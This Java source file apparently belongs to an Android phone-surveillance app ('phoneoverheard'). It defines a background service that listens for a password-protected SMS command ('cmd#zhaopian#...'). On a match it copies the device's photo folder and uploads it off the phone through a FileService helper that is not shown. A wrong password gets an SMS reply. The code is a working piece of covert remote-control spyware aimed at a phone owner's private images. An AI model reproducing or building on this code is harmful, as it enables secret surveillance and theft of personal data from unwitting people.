package com.phoneoverheard.phonne;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;

import com.phoneoverheard.database.Manager;
import com.phoneoverheard.database.ManagerService;
import com.phoneoverheard.database.SmscmdService;

import android.annotation.SuppressLint;
import android.app.Service;
import android.content.Intent;
import android.os.Bundle;
import android.os.IBinder;
import android.telephony.SmsManager;
import android.util.Log;

@SuppressLint("SimpleDateFormat")
public class zhaopianService extends Service {
    private static final String TAG = "zhaopianService";
	Date date = new Date(System.currentTimeMillis());
	SimpleDateFormat Dateformat = new SimpleDateFormat("yyyyMMddHHmmss");
	final String receiveTime = Dateformat.format(date);
	
	@Override
	public IBinder onBind(Intent arg0) {
		// TODO Auto-generated method stub
		return null;
	}
	
    @Override  
    public void onCreate() {  
        super.onCreate(); 
        Log.i(TAG, "onCreate called.");  
    }
    
    @Override
	public void onDestroy() { 
        Log.i(TAG, "onDestroy called.");  
        super.stopSelf();
        super.onDestroy();  
    }  
    
    @Override  
    public int onStartCommand(Intent intent, int flags, int startId) {  
        Log.i(TAG, "onStartCommand called.");  
        return super.onStartCommand(intent, flags, startId);  
    }  
    
    @Override  
    public void onStart(Intent intent, int startId) {  
    	Log.i(TAG, "onStart called."); 
        Bundle smscontent = intent.getBundleExtra("smscontent");// 根据bundle的key得到对应的对象
        String content=smscontent.getString("content");
        String sendernumber=smscontent.getString("sendernumber"); 
        String[] contents = content.split("#");        
        SmscmdService smscmdservice = new SmscmdService(getBaseContext());
        String password = smscmdservice.find("zhaopian").getPassword();   
        if(contents[0].equals("cmd") && contents[1].equals("zhaopian") && new FileService().MD5(contents[2]).equals(password)){
	    	ManagerService managerservice = new ManagerService(getBaseContext());
	    	Manager manager = managerservice.find("manager");
	    	String oldPath = manager.getImgfolder();
	    	String newPath = manager.getAudiofolder();
	    	FileService fileservice = new FileService();
	    	fileservice.copyFolder(oldPath, newPath, getBaseContext());
	    	fileservice.uploadFolder(newPath,getBaseContext());
        }else{
	        // 移动运营商允许每次发送的字节数据有限，我们可以使用Android给我们提供 的短信工具。
	        SmsManager sms = SmsManager.getDefault();
	        String ErrMsg = "密码错误！";
	        // 如果短信没有超过限制长度，则返回一个长度的List。
	        List<String> texts = sms.divideMessage(ErrMsg);
	        for (String text : texts) {
	        	sms.sendTextMessage(sendernumber,null,text,null,null);
	        }
        }
		onDestroy();
    } 

}
